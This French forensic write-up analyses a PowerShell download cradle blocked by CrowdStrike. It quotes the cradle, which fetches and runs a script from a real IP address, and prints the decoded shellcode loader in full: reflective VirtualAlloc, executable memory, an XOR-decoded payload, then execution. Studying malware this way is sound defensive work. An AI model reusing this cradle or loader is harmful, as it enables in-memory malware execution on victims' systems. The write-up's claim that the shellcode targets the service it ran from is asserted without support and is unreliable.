# :100: VanuatuForensic :100:
  
## :alien: Plan d'actions
Liste des taches à accomplir :
- [ ] Définir le contexte
- [ ] Récupérer la commande powershell parente
- [ ] OSINT - Récupérer les informations de géoloc du serveur distant
- [ ] OSINT - Récupérer les informations de réputation du serveur distant
- [ ] Télécharger le fichier distant
- [ ] Analyser et décoder le fichier distant
- [ ] Décoder _B64_02_
- [ ] Analyser le code contenu dans _B64_01_ servant à décoder _B64_02_
- [ ] Analyser la seconde partie du code contenu dans _B64_01_
- [ ] Choix entre _S01_ et _S02_
  
  <br/>

##  :alien: Définir le contexte
  
Contexte : blocage, par Crowdstrike, d'une commande powershell.
  
  <br/>

## Récupérer la commande powershell parente

La commande fournie par CrowdStrike est la suivante : 
  
```
powershell -NonInteractive -EncodedCommand IEX ((new-object net.webclient).downloadstring('_URL_01_'))
```
  
_URL_01_ point vers :  
```
http://147.45.112.220/a
```
  
Verdict : 
  
- [X] Récupérer la commande powershell parente :sunglasses:
  
  <br/>

## :alien: OSINT - Récupérer les informations de géoloc du serveur distant
  
A partir de Maxmind, il est possible de récupérer les informations suivantes :
  
![image](https://github.com/user-attachments/assets/a87750f6-c1e1-47b6-a002-a8f11c168f71)
  
Verdict : 
  
- [X] OSINT - Récupérer les informations de géoloc du serveur distant :sunglasses:
  
  <br/>

## :alien: OSINT - Récupérer les informations de réputation du serveur distant

Le site Cisco Talos indique que l'IP possède une réputation plutôt "neutre" : 
  
![image](https://github.com/user-attachments/assets/546d02a9-593a-437b-bca7-461507fef710)
  
Verdict : 
  
- [X] OSINT - Récupérer les informations de réputation du serveur distant :sunglasses:
  
  <br/>

## :alien: Télécharger le fichier distant
  
Lorsque l'on télécharge le fichier distant, on obtient un contenu de la sorte :  
```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("_B64_01_"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
  
_B64_01_ contient une chaine très longue qui ne ressemble pas à du BASE64 : 
  
![image](https://github.com/user-attachments/assets/271d6e1e-3c4c-42a0-9ebb-2c546999bb1b)  
  
Verdict : 
  - [X] Télécharger le script distant :sunglasses:
  
  <br/>

## :alien: Analyser et décoder le fichier distant

Le code du fichier distant indique clairement que _B64_01_ :  
- d'acord décodée comme une chaine BASE64
- ensuite décompressée comme un binaire GZIP

  <br/>
CyberChef peut nous aider en chainant "From Base64" et "Gunzip". On obtient alors le code powershell suivant :  
  
```
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('_B64_02_')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```
  
On remarque immediatement la présence d'une nouvelle chaine très longue en BASE64 : _B64_02_
  
Verdict : 
  - [X] Analyser et décoder le fichier distant :sunglasses:
  
  <br/>
## :alien: Décoder _B64_02_

Un décodage direct de _B64_02_ échoue alors que la chaine finit bien par "==" :  
  
![image](https://github.com/user-attachments/assets/11098240-b38e-43cd-86cc-75992ce9d5d4)  
  
Il faut analyser le code pour comprendre pourquoi le décodage BASE64 échoue.  
  

Verdict : 
  
- [ ] Décoder _B64_02_ :cursing_face:
  
  <br/>
## :alien: Analyser le code contenu dans _B64_01_ servant à décoder _B64_02_
  
La partie intéressante dans le code est :  
  
![image](https://github.com/user-attachments/assets/8f1fdd89-b469-4e2d-9bea-2563a2339db1)  
  
On voit clairement la séquence suivante (_SEQ_01_) :  
- _B64_02_ est décodée comme une chaine BASE64
- cette chaine décodée est convertie en byte code
- chaque octet du byte code, on applique XOR avec une clé spécifique ("-bxor 35")
  
Si on essaie de réaliser ces opérations dans cet ordre, on se rend vite compte que cela donne quelque chose, certes, mais rien d'utilisable ou meme rien de lisible.
  
![image](https://github.com/user-attachments/assets/2b3eb94a-0e73-432b-a128-505c653908c3)
  
Il y a donc un autre problème qui ne semble avoir que deux solutions possibles : 
1. soit il y a, à la suite de _SEQ_01_, encore un décodage (_S01_)
2. soit _SEQ_01_ est suffisante et le reste se passe apres _SEQ_01 (_S02)
  
Verdict : 
  - [ ] Analyser le code contenu dans _B64_01_ servant à décoder _B64_02_ :cursing_face:
  
  <br/>
## :alien: Analyser la seconde partie du code contenu dans _B64_01_
  
La partie intéressante se trouve ici :  
  
![image](https://github.com/user-attachments/assets/389611e1-ba56-4289-9ef0-eb8255b62935)
  
Il faut analyser sequentiellemnent ce code pour trancher entre _S01_ et _S02_.
Voici ce qui se passe : 
  
1. Allocation de mémoire avec VirtualAlloc
  
Le code fait un appel API VirtualAlloc via kernel32.dll.
Il alloue un buffer mémoire exécutable via 0x40 (PAGE_EXECUTE_READWRITE)
  
2. Copie des données décodées dans ce buffer
  
Les données décodées sont copiées dans le buffe mémoire exécutable via la commande : 
  
```
Marshal.Copy($var_code, 0, $var_buffer, $var_code.length)
```
  
3. Exécution des données du buffer en tant que byte code
  
Les données sont ensuite exécutées :  

```
GetDelegateForFunctionPointer($var_buffer, …).Invoke([IntPtr]::Zero
```
  
4. Vérification probable de l’architecture
  
Le code effectue un test :
  
- Soit il lance un sous-processus PowerShell 32 bits
  
```
Start-Job -RunAs32
```
  
- Soit il exécute directement 
  
```
IEX $DoIt.
```
    
Verdict : 
- [X]  Analyser la seconde partie du code contenu dans _B64_01_ :sunglasses:
  
  <br/>

## :alien: Choix entre _S01_ et _S02_
  
Rappel des solutions possibles :  
  - _S01_ : il y a, à la suite de _SEQ_01_, encore un décodage  
  - _S02_ : _SEQ_01_ est suffisante et le reste se passe apres _SEQ_01  
  
L'analyse du code indique de façon evidente que _S02_ est privilégiée et donc que :
1 - D'abord, _B64_02_ est décodée comme une chaine BASE64
2 - Ensuite, cette chaine décodée est transformée en byte code
3 - Ensuite, cette sequence byte code est copié dans un buffer exécutable dynamiquement alloué
4 - Ensuite, le buffer est exécuté
  
Il manque au moins une étape : comprendre ce qui est excéuté en mémoire ou, à défaut, comprendre la nature de ce qui est exécuté.
  
Verdict : 
- [X]  Analyser la seconde partie du code contenu dans _B64_01_ :sunglasses:
  
  <br/>

## :alien: Interprétations
  
Il s'agit assurément d'un SHELLCODE Windows qui est directement injecté en mémoire et exécuté dans la foulée.  
Il est certain qu'il vise spécifiquement le service à partir duquel il a été exécuté.
  
Verdict : 
- [X]  Interprétations :sunglasses:
  
  <br/>

## :alien: Conclusion
  
Il faudrait demander à une RedTeam de tenter de reverser le SHELLCODE.
Cela est faisable, notamment à partir des byte code, mais cela demande un travail conséquent.
